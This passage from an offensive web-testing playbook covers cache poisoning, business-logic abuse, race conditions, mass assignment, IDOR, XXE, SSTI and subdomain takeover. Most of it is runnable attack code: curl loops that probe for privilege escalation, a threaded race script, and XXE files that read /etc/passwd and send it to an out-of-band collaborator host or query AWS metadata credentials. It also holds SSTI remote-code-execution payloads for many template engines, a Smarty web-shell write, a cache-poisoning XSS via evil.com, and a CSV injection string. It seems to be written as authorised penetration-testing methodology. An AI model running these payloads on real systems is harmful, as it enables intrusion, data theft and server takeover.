    b"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
    b"Transfer-Encoding:\x0bchunked",
    b"Transfer-Encoding: x",
    b"Transfer-Encoding:[tab]chunked",
    b"X: X[\n]Transfer-Encoding: chunked",
    b"Transfer-Encoding: chunked1",
]
print("\nTE.TE obfuscation tests:")
for te in te_variants:
    print(f"  {te.decode(errors='replace')}")
```

## PHASE 9 — CACHE POISONING

```bash
TARGET_URL="https://target.com"

# Detect caching
curl -sI $TARGET_URL | grep -i "x-cache\|cf-cache\|age\|cache-control\|etag\|vary" | tee cache_headers.txt

# Unkeyed header reflection
for header in "X-Forwarded-Host" "X-Forwarded-Scheme" "X-Forwarded-Proto" \
  "X-Host" "X-Rewrite-URL" "X-Original-URL" "X-HTTP-Method-Override" \
  "Forwarded" "X-Forwarded-Server" "X-Forwarded-Port" "X-Original-Host" \
  "X-Forwarded-For-Original" "X-Custom-IP-Authorization"; do
  RESP=$(curl -s -H "$header: evil.com" $TARGET_URL)
  if echo "$RESP" | grep -qi "evil.com"; then
    echo "[+] REFLECTED: $header" | tee -a cache_poison_candidates.txt
  fi
done

# Web Cache Deception
for ext in .css .js .png .ico .gif .jpg .woff2 .svg .json .txt; do
  STATUS=$(curl -sI "${TARGET_URL}/account${ext}" -o /dev/null -w "%{http_code}")
  CACHE=$(curl -sI "${TARGET_URL}/account${ext}" | grep -i "x-cache\|age" | head -1)
  echo "$STATUS $ext | $CACHE" | tee -a cache_deception.txt
done

# Cache poisoning XSS via X-Forwarded-Host
curl -s -H "X-Forwarded-Host: evil.com" $TARGET_URL | grep "evil.com" && {
  echo "[+] XFH reflected — poisoning cache"
  # Send with XSS payload
  curl -s -H 'X-Forwarded-Host: evil.com"><script>alert(document.domain)</script>' $TARGET_URL \
    | tee cache_xss_poison.txt
  # Verify cache served the poisoned version
  sleep 2
  curl -s $TARGET_URL | grep "evil.com" && echo "[CRITICAL] Cache poisoned with XSS!"
}

# Fat GET attack
curl -sI -X GET $TARGET_URL \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "x=injected_value" | tee cache_fat_get.txt

# Unkeyed query parameter
curl -s "${TARGET_URL}?ignored_param=evil_value" | grep "evil_value" && \
  echo "[+] Unkeyed query param reflected — cache poisoning via QS"
```

## PHASE 10 — BUSINESS LOGIC FLAWS

```
PRICE/PAYMENT (test these):
  1.  Negative quantity: {"quantity": -1} in cart API
  2.  Zero price: modify price param to 0 after add-to-cart
  3.  Integer overflow: {"quantity": 9999999999} -> wraps negative
  4.  Coupon race: 20 parallel POST /cart/coupon with same code
  5.  Coupon different cart: validate on cart A, apply to cart B
  6.  Skip payment: POST /order/confirm directly after cart creation
  7.  Replay payment token: reuse old successful payment token
  8.  Currency manipulation: change "currency":"USD" to "currency":"VND" after price calc
  9.  Retroactive discount: IDOR on order ID to apply code after purchase
  10. Negative order total → store credit

AUTHENTICATION:
  11. Password reset token reuse (no invalidation after use)
  12. Password reset token brute force (check token length and charset)
  13. Change email → skip re-verification → steal another account
  14. Change password without current password check
  15. Session not invalidated on logout (test by using old session token)
  16. Session not invalidated on password change
  17. MFA step 2 direct access: GET /mfa/verify without completing step 1
  18. MFA token reuse across accounts
  19. Case-insensitive email bypass: ADMIN@SITE.COM == admin@site.com
  20. Infinite login attempts (missing lockout)

AUTHORIZATION:
  21. IDOR: change user ID in URL/body to another user's ID
  22. Mass assignment: include role/isAdmin in registration POST body
  23. Function-level: API endpoint /api/admin/* accessible to regular user
  24. JWT role claim manipulation (see Phase 6)
  25. Access soft-deleted resources via direct ID reference
  26. Draft/unpublished content via direct URL

WORKFLOW:
  27. Skip intermediate checkout steps via direct API call
  28. Apply referral code to own account
  29. Transfer more than balance via race condition
  30. Order without stock check (concurrent requests)
  31. Double submit: two simultaneous POST /order/complete

VALIDATION:
  32. Unicode normalization: ℳ (U+2133) for m, ＠ (U+FF20) for @
  33. Null bytes in input: user%00@evil.com matches user@evil.com
  34. CSV injection in exports: =cmd|' /C calc'!A0
  35. Extra-long inputs trigger truncation → collisions
```

## PHASE 11 — RACE CONDITIONS

```python
# race.py — parallel request race condition testing
import threading, requests, time, sys

TARGET = "https://target.com/api/promo/apply"
HEADERS = {"Content-Type": "application/json", "Cookie": "session=VALID_SESSION"}
PAYLOAD = {"promo_code": "SAVE100", "order_id": "ORD-12345"}
N = 25

results = []
barrier = threading.Barrier(N)

def race_req():
    barrier.wait()  # all threads start simultaneously
    try:
        r = requests.post(TARGET, json=PAYLOAD, headers=HEADERS, timeout=10)
        results.append((r.status_code, r.text[:150]))
    except Exception as e:
        results.append((0, str(e)))

print(f"Launching {N} simultaneous requests...")
threads = [threading.Thread(target=race_req) for _ in range(N)]
for t in threads: t.start()
for t in threads: t.join()

print("\nResults:")
from collections import Counter
status_counts = Counter(r[0] for r in results)
print(f"Status distribution: {dict(status_counts)}")

successes = [r for r in results if r[0] == 200 and "success" in r[1].lower()]
print(f"\n[{'RACE WIN!' if len(successes) > 1 else 'failed'}] {len(successes)}/{N} succeeded")
for r in successes:
    print(f"  {r[1][:100]}")
```

```
# Turbo Intruder script (Burp extension) — single-packet attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=30,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, None, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

## PHASE 12 — MASS ASSIGNMENT

```bash
TARGET_URL="https://target.com"
AUTH="Authorization: Bearer VALID_TOKEN"

# Probe registration with privileged fields
curl -s -X POST "$TARGET_URL/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@evil.com","password":"Passw0rd!","role":"admin","isAdmin":true,"verified":true,"balance":99999}' \
  | jq . | tee mass_assign_register.txt

# Probe profile update
for field in '{"role":"admin"}' '{"isAdmin":true}' '{"admin":true}' \
  '{"is_admin":true}' '{"is_staff":true}' '{"permissions":["admin"]}' \
  '{"plan":"enterprise"}' '{"subscriptionTier":"premium"}' \
  '{"verified":true}' '{"emailVerified":true}' '{"balance":99999}' \
  '{"accountType":"admin"}' '{"userType":"admin"}' '{"access_level":9}'; do
  RESP=$(curl -s -X PUT "$TARGET_URL/api/user/me" \
    -H "Content-Type: application/json" -H "$AUTH" -d "$field")
  echo "$field -> $RESP" | tee -a mass_assign_results.txt
done

# Check result
curl -s -H "$AUTH" "$TARGET_URL/api/user/me" | jq . | tee mass_assign_check.txt
```

## PHASE 13 — IDOR

```bash
TARGET_URL="https://target.com"
AUTH="Authorization: Bearer USER_A_TOKEN"
VICTIM_ID="2"

# Object-level IDOR
for path in "/api/user/$VICTIM_ID" "/api/user/$VICTIM_ID/profile" \
  "/api/orders/$VICTIM_ID" "/api/invoices/$VICTIM_ID" \
  "/api/files/$VICTIM_ID" "/api/messages/$VICTIM_ID" \
  "/api/transactions/$VICTIM_ID" "/api/accounts/$VICTIM_ID"; do
  STATUS=$(curl -sI -H "$AUTH" "${TARGET_URL}${path}" -o /dev/null -w "%{http_code}")
  [ "$STATUS" = "200" ] && echo "[IDOR!] $path" | tee -a idor_results.txt
done

# File download IDOR
for fid in $(seq 1 50); do
  STATUS=$(curl -sI -H "$AUTH" "${TARGET_URL}/api/files/$fid/download" -o /dev/null -w "%{http_code}")
  [ "$STATUS" = "200" ] && echo "[IDOR] File $fid" | tee -a idor_files.txt
done

# HTTP method bypass
for method in GET POST PUT PATCH DELETE HEAD; do
  STATUS=$(curl -sI -X $method -H "$AUTH" "${TARGET_URL}/api/user/$VICTIM_ID" -o /dev/null -w "%{http_code}")
  echo "$method -> $STATUS" | tee -a idor_methods.txt
done

# Automated with ffuf
ffuf -u "${TARGET_URL}/api/user/FUZZ/profile" \
  -w <(seq 1 200) \
  -H "$AUTH" -mc 200 -o idor_ffuf.json -of json 2>/dev/null
```

## PHASE 14 — XXE OOB EXFILTRATION

```bash
COLLAB="UNIQUE.burpcollaborator.net"
TARGET_URL="https://target.com"

# Linux file read + OOB
cat > xxe_linux.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://$COLLAB/?data=%file;'>">
  %wrap;
  %send;
]>
<root><data>test</data></root>
EOF

# Windows file read + OOB
cat > xxe_windows.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
  <!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://$COLLAB/?data=%file;'>">
  %wrap;
  %send;
]>
<root><data>test</data></root>
EOF

# AWS metadata SSRF via XXE
cat > xxe_aws.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>
EOF

# Error-based XXE
cat > xxe_error.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>
EOF

# SVG upload XXE
cat > xxe.svg << EOF
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="15">&xxe;</text>
</svg>
EOF

# Test targets
curl -s -X POST "$TARGET_URL/api/import" \
  -H "Content-Type: application/xml" --data-binary @xxe_linux.xml | tee xxe_xml_resp.txt

curl -s -X POST "$TARGET_URL/api/soap" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: test" --data-binary @xxe_linux.xml | tee xxe_soap_resp.txt

curl -s -X POST "$TARGET_URL/api/avatar" \
  -F "file=@xxe.svg;type=image/svg+xml" | tee xxe_svg_resp.txt

curl -s -X POST "$TARGET_URL/api/import" \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$(cat xxe_linux.xml | base64 -w0)\"}" | tee xxe_b64_resp.txt
```

## PHASE 15 — SSTI PER ENGINE

```bash
TARGET_URL="https://target.com/page"
PARAM="name"

urlencode() { python3 -c "import urllib.parse; print(urllib.parse.quote('$1'))"; }

# Detection
for payload in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '*{7*7}' '[[7*7]]' '{7*7}'; do
  ENC=$(urlencode "$payload")
  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
  echo "$payload -> $(echo $RESP | grep -oP '49|Error|Exception|undefined' | head -1)" | tee -a ssti_detect.txt
done

# ===== JINJA2 (Python/Flask) =====
JINJA2_RCE1='{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
JINJA2_RCE2='{{cycler.__init__.__globals__.os.popen("id").read()}}'
JINJA2_RCE3='{{joiner.__init__.__globals__.os.popen("id").read()}}'
JINJA2_RCE4='{{namespace.__init__.__globals__.os.popen("id").read()}}'
JINJA2_RCE5='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
JINJA2_RCE6='{{"".__class__.__mro__[1].__subclasses__()[213]("id",shell=True,stdout=-1).communicate()[0]}}'
# Blind SSRF/OOB
JINJA2_OOB='{{request.application.__globals__.__builtins__.__import__("urllib.request").urlopen("http://COLLAB/")}}'

for rce in "$JINJA2_RCE1" "$JINJA2_RCE2" "$JINJA2_RCE3" "$JINJA2_RCE4" "$JINJA2_RCE5"; do
  ENC=$(urlencode "$rce")
  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
  echo "$RESP" | grep -qiP "uid=|root|www-data" && echo "[RCE] $rce" | tee -a ssti_jinja2_rce.txt
done

# ===== TWIG (PHP) =====
TWIG_RCE1='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
TWIG_RCE2='{{["id"]|map("system")|join}}'
TWIG_RCE3='{{["id", "0"]|sort("system")|join}}'
TWIG_RCE4='{{{"a":"id"}|map("system")}}'
TWIG_RCE5='{{"/etc/passwd"|file_excerpt(1,30)}}'
TWIG_RCE6='<|"id"|system>'
# Twig v1 only
TWIG_V1='{{_self.env.enableDebug()}}{{_self.env.disableAutoEscape()}}'

for rce in "$TWIG_RCE1" "$TWIG_RCE2" "$TWIG_RCE3" "$TWIG_RCE4"; do
  ENC=$(urlencode "$rce")
  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
  echo "$RESP" | grep -qiP "uid=|root|www-data" && echo "[RCE] Twig: $rce" | tee -a ssti_twig_rce.txt
done

# ===== FREEMARKER (Java) =====
FREEMARKER_RCE1='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
FREEMARKER_RCE2='${product.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}'
FREEMARKER_RCE3='<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.field("DEFAULT_WRAPPER").get(owc)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${dwf.newInstance(ec,null)("id")}'
FREEMARKER_DETECT='${7*7}'

for rce in "$FREEMARKER_RCE1" "$FREEMARKER_DETECT"; do
  ENC=$(urlencode "$rce")
  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
  echo "Freemarker $rce -> $(echo $RESP | grep -oP '49|uid=\d+' | head -1)" | tee -a ssti_freemarker.txt
done

# ===== VELOCITY (Java) =====
VELOCITY_RCE1='#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")'
VELOCITY_RCE2='#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end'
VELOCITY_DETECT='#set($x=1+1)$x'

# ===== PEBBLE (Java) =====
PEBBLE_RCE='{{ variable.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(variable.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id") }}'
PEBBLE_DETECT='{{ 7*7 }}'

# ===== SMARTY (PHP) =====
SMARTY_RCE1='{php}echo `id`;{/php}'
SMARTY_RCE2='{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]); ?>",self::clearConfig())}'
SMARTY_RCE3='{system("id")}'
SMARTY_DETECT='{$smarty.version}'

# ===== ERB (Ruby) =====
ERB_RCE1='<%= `id` %>'
ERB_RCE2='<%= system("id") %>'
ERB_RCE3='<%= IO.popen("id").read %>'
ERB_RCE4='<%= require "open3"; Open3.capture2("id")[0] %>'
ERB_DETECT='<%= 7*7 %>'

# ===== MAKO (Python) =====
MAKO_RCE1='${__import__("os").popen("id").read()}'
MAKO_RCE2='<%\nimport os\nx=os.popen("id").read()\n%>${x}'
MAKO_RCE3='${self.module.cache.util.os.system("id")}'
MAKO_DETECT='${7*7}'

# Test all engines
for rce in "$ERB_RCE1" "$ERB_RCE2" "$ERB_DETECT" "$MAKO_RCE1" "$SMARTY_RCE1" "$SMARTY_DETECT"; do
  ENC=$(urlencode "$rce")
  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
  MATCH=$(echo "$RESP" | grep -oP "49|uid=\d+|root|www-data" | head -1)
  [ -n "$MATCH" ] && echo "[SSTI RCE] $rce ($MATCH)" | tee -a ssti_all_rce.txt
done
```

## PHASE 16 — SUBDOMAIN TAKEOVER

```bash
TARGET_DOMAIN="target.com"

# Check all resolved subdomains for dangling DNS (CNAME pointing to dead service)
while read sub; do
  CNAME=$(dig $sub CNAME +short | head -1)
  if [ -n "$CNAME" ]; then
    # Check if CNAME target responds
    STATUS=$(curl -sI "https://$CNAME" -o /dev/null -w "%{http_code}" 2>/dev/null)
    if [ "$STATUS" = "000" ] || echo "$STATUS" | grep -q "^404$"; then
      echo "[POTENTIAL TAKEOVER] $sub CNAME -> $CNAME (HTTP $STATUS)" | tee -a takeover_candidates.txt
    fi
    # Check for known takeover fingerprints
    BODY=$(curl -s "https://$sub" 2>/dev/null)
    for fingerprint in \
      "There is no app configured at that hostname" \
      "No such app" \
      "herokucdn.com" \
      "Repository not found" \
      "The feed has not been found" \
      "This UserVoice subdomain is currently available" \
      "project not found" \
      "Sorry, we can't find the content you're looking for at this URL" \
      "The thing you were looking for is no longer here" \
      "Unrecognized domain" \
      "Do you want to register" \
      "Available for purchase" \
      "NoSuchBucket" \
      "fastly error: unknown domain"; do
      echo "$BODY" | grep -qi "$fingerprint" && \
        echo "[TAKEOVER] $sub - FINGERPRINT: $fingerprint" | tee -a takeover_confirmed.txt
    done
  fi
done < $WORKSPACE/recon/subdomains/resolved.txt

# Use nuclei takeover templates
nuclei -l $WORKSPACE/recon/subdomains/resolved.txt \
  -t http/takeovers/ \
  -o takeover_nuclei.txt -silent 2>/dev/null

# subjack
which subjack > /dev/null 2>&1 && \
  subjack -w $WORKSPACE/recon/subdomains/all_subdomains.txt \
    -t 100 -timeout 30 -o takeover_subjack.txt -ssl 2>/dev/null

# subzy
which subzy > /dev/null 2>&1 && \
  subzy run --targets $WORKSPACE/recon/subdomains/all_subdomains.txt \
    --output takeover_subzy.txt 2>/dev/null
```

## PHASE 17 — CVE-CLASS PATTERN RECOGNITION

Recognize code patterns that historically generate CVEs:

```
PHP CVE PATTERNS:
  - unserialize() with user input → PHP Object Injection (CVE class: CWE-502)
  - include($variable) without whitelist → RFI/LFI (CWE-22, CWE-98)
  - eval() with template data → RCE (CWE-94)
  - move_uploaded_file() without extension check → Unrestricted Upload (CWE-434)
  - preg_replace() with /e modifier → RCE (deprecated PHP 5.5+, still seen)
  - strcmp() for auth → Type Juggling bypass
  - == for password comparison → Type Juggling (md5("240610708")==md5("QNKCDZO"))

NODE.JS CVE PATTERNS:
  - require() with user path → Path Traversal + RCE
  - child_process.exec with string concat → Command Injection (CWE-77)
  - eval()/Function() with user data → RCE (CWE-94)
  - lodash.merge() with user JSON → Prototype Pollution (CVE-2019-10744)
  - serialize() + eval() → RCE (node-serialize CVE-2017-5941)
  - jwt.verify() without algorithm check → Algorithm Confusion
  - mongoose find({}) with req.query spread → NoSQL Injection (CWE-943)

PYTHON CVE PATTERNS:
  - yaml.load() without Loader → RCE via PyYAML (CWE-502)
  - pickle.loads() with user data → RCE (CWE-502)
  - subprocess with shell=True + user data → Command Injection
  - Jinja2 render_template_string with user data → SSTI (CWE-94)
  - Django ORM .extra() / .raw() with string format → SQLi (CWE-89)
  - flask.redirect() with user URL → Open Redirect (CWE-601)
  - os.path.join() with leading "/" in user part → Path Override

JAVA CVE PATTERNS:
  - ObjectInputStream.readObject() → Deserialization RCE (CWE-502)
  - Runtime.exec() with String concat → Command Injection (CWE-78)
  - DocumentBuilderFactory without setFeature disallow-doctype → XXE (CWE-611)
  - XStream.fromXML() without security config → CVE class (CWE-502)
  - Velocity/FreeMarker template from user input → SSTI
  - Spring @RequestMapping without @PreAuthorize → Missing Auth (CVE class)
  - Java EL in JSP/Thymeleaf with user data → EL Injection (CWE-917)

.NET CVE PATTERNS:
  - BinaryFormatter.Deserialize() → RCE (CWE-502, Microsoft advisories)
  - TypeNameHandling.All in Newtonsoft → RCE (CWE-502)
  - Response.Write() without HtmlEncode → XSS (CWE-79)
  - SqlCommand with string concat → SQLi (CWE-89)
  - Server.Execute() / Response.Redirect() with user URL → Open Redirect
  - ViewState without MAC → Deserialization (CVE class)

GO CVE PATTERNS:
  - http.ServeFile() with user path and no validation → Path Traversal
  - template.HTML() / template.JS() cast → XSS bypass (CWE-79)
  - exec.Command() with string builder → Command Injection
  - sql.Query() with Sprintf → SQLi (CWE-89)
```

## ZERO-DAY REPORT TEMPLATE

```
=== ZERO-DAY FINDING ===
Title:
CVE Class:
Severity: Critical / High / Medium / Low
CVSS Score:
Affected Component:
Affected Version:
Vulnerability Type:

DESCRIPTION:
(technical explanation of the vulnerability)

ROOT CAUSE:
(specific code pattern or misconfiguration)

PROOF OF CONCEPT:
Request:
---
[HTTP request or payload]
---

Response:
---
[Server response showing impact]
---

IMPACT:
(what an attacker can achieve)

REPRODUCTION STEPS:
1.
2.
3.

EVIDENCE:
File: [path to screenshot/response]
Hash: [sha256 of evidence file]

REMEDIATION:
(specific code fix)

REFERENCES:
- [CVE or CWE references]
```
